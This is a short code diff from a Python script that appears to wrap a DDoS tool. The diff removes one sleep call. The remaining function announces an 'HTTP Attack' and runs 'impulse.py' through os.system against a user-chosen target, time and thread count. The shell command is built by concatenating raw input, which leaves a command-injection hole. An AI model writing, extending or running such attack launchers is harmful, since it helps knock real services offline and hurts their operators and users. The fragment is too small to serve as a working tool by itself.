@@ -26,7 +26,6 @@ if cont == 'N':
     exit()
 def http():
     print(Fore.LIGHTYELLOW_EX+"  Starting HTTP Attack!")
-    time.sleep(2)
     os.system("python3 impulse.py --target "+ip+"  --time "+attacktime+"--threads "+threadcount+" --method HTTP")
     try:
         """Okehhh"""
